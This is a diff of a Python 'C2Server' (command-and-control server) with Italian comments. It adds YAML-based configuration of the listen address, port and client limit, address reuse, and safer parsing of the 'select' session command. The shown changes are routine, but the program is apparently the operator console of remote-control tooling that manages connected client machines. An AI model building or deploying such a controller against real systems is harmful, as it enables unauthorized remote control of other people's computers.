@@ -1,6 +1,7 @@
 import os
 import socket
 import threading
+import yaml
 from datetime import datetime
 from pathlib import Path
 
@@ -26,23 +27,71 @@ class ClientHandler:
 
 
 class C2Server:
-    """Il nucleo del Server Command & Control."""
-    def __init__(self, host='0.0.0.0', port=7771, max_conns=5):
-        self.host = host
-        self.port = port
-        self.max_connections = max_conns
+    """Il nucleo del Server Command & Control con supporto YAML."""
+    def __init__(self, config_path="../conf/configuration.yaml"):
+        self.config_path = Path(config_path)
+        self.setup_directories()
+        
+        # Caricamento configurazione
+        config = self.load_config()
+        print(config)
+        self.host = config['host']
+        self.port = config['port']
+        self.max_connections = config['max_connections']
         
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.clients = {}  
         self.client_id_counter = 0
         self.selected_id = None
         self.lock = threading.Lock()
-        
-        self.setup_directories()
 
     def setup_directories(self):
+        """Crea le cartelle necessarie usando pathlib."""
         Path("../log").mkdir(exist_ok=True)
         Path("../conf").mkdir(exist_ok=True)
+
+    def load_config(self):
+        """Carica configurazione da YAML o imposta i default richiesti."""
+        default_config = {
+            'host': '0.0.0.0',
+            'port': 7771,
+            'max_connections': 5
+        }
+
+        if self.config_path.exists():
+            try:
+                with open(self.config_path, 'r') as f:
+                    data = yaml.safe_load(f)
+                    server_data = data.get('server', {})
+                    print("[*] Configurazione YAML caricata.")
+                    return {
+                        'host': server_data.get('host', default_config['host']),
+                        'port': server_data.get('port', default_config['port']),
+                        'max_connections': server_data.get('maxc', default_config['max_connections'])
+                    }
+            except Exception as e:
+                print(f"[!] Errore YAML: {e}. Uso default.")
+        else:
+            print("[!] File configurazione mancante. Creazione in corso...")
+            self.save_config(default_config)
+        
+        return default_config
+
+    def save_config(self, config):
+        """Salva la configurazione corrente in formato YAML."""
+        try:
+            with open(self.config_path, 'w') as f:
+                # Struttura richiesta: host, port, maxc
+                yaml_data = {
+                    'server': {
+                        'host': config['host'],
+                        'port': config['port'],
+                        'maxc': config['max_connections']
+                    }
+                }
+                yaml.dump(yaml_data, f, default_flow_style=False)
+        except Exception as e:
+            print(f"[!] Errore salvataggio config: {e}")
 
     def log(self, message):
         log_path = Path(f"../log/server.log")
@@ -51,10 +100,9 @@ class C2Server:
             f.write(f"[{timestamp}] {message}\n")
 
     def display_help(self):
-        """Mostra la guida ai comandi disponibili."""
         help_text = """
 ============================================================
-           GUIDA COMANDI C2 SERVER
+               GUIDA COMANDI C2 SERVER
 ============================================================
 Comandi Generali:
   list             - Mostra tutti i client connessi
@@ -72,17 +120,16 @@ Comandi Sessione (dopo 'select'):
 
     def start(self):
         try:
+            # Permette il riutilizzo dell'indirizzo se il server viene riavviato subito
+            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.server_socket.bind((self.host, self.port))
             self.server_socket.listen(self.max_connections)
             
             threading.Thread(target=self.accept_loop, daemon=True).start()
             
-            print(f"[*] Server avviato su {self.host}:{self.port}")
+            print(f"[*] Server ascolta su {self.host}:{self.port} (Max Client: {self.max_connections})")
             self.log("Server Started")
-            
-            # Mostra l'help all'avvio
             self.display_help()
-            
             self.terminal()
         except Exception as e:
             print(f"[!] Errore avvio server: {e}")
@@ -139,12 +186,14 @@ Comandi Sessione (dopo 'select'):
                 self.list_clients()
             elif cmd.startswith('select '):
                 try:
-                    cid = int(cmd.split(' ')[1])
-                    if cid in self.clients:
-                        self.selected_id = cid
-                        print(f"[*] Sessione avviata con ID {cid}")
-                    else:
-                        print("[!] ID non trovato.")
+                    parts = cmd.split(' ')
+                    if len(parts) > 1:
+                        cid = int(parts[1])
+                        if cid in self.clients:
+                            self.selected_id = cid
+                            print(f"[*] Sessione avviata con ID {cid}")
+                        else:
+                            print("[!] ID non trovato.")
                 except: print("[!] Uso: select <id>")
             elif cmd == 'back':
                 self.selected_id = None
